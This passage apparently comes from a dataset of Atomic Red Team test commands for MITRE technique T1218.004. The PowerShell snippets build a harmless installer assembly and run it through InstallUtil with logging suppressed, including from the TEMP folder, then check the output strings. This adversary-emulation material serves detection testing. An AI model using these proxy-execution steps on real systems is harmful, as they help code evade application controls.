             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = 'CheckIfInstallable'\n"
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'CheckIfInstallable method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "T1218.004.dll"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'CheckIfInstallable method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. '
             'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallHelper method execution test failure. Installer assembly '
             'execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "$Env:TEMP\\"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallHelper method execution test failure. Installer assembly '
             'execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = 'InstallHelper'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallHelper method execution test failure. Installer assembly '
             'execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "T1218.004.dll"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallHelper method execution test failure. Installer assembly '
             'execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. '
             'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil class constructor execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "$Env:TEMP\\"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil class constructor execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = 'Executable'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil class constructor execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "T1218.004.dll"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil class constructor execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. '
             'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '/installtype=notransaction /action=install '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Install_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Install method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "$Env:TEMP\\"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '/installtype=notransaction /action=install '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Install_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Install method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '/installtype=notransaction /action=install '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Install_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = 'Executable'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Install method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "T1218.004.dll"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '/installtype=notransaction /action=install '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Install_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Install method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. '
             'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false /U '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Uninstall_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Uninstall method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "$Env:TEMP\\"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false /U '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Uninstall_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Uninstall method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false /U '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Uninstall_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = 'Executable'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Uninstall method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "T1218.004.dll"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false /U '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Uninstall_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Uninstall method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. '
             'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '/installtype=notransaction /action=uninstall '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Uninstall_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Uninstall method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "$Env:TEMP\\"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '/installtype=notransaction /action=uninstall '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Uninstall_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Uninstall method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '/installtype=notransaction /action=uninstall '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Uninstall_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = 'Executable'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Uninstall method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "T1218.004.dll"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/logfile= /logtoconsole=false '
             '/installtype=notransaction /action=uninstall '
             '`"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_Uninstall_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil Uninstall method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. '
             'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             '$CommandLine = "/? `"$InstallerAssemblyFullPath`""\n'
             "$ExpectedOutput = 'Constructor_HelpText_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '    CommandLine = $CommandLine\n'
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'InstallUtil HelpText property execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
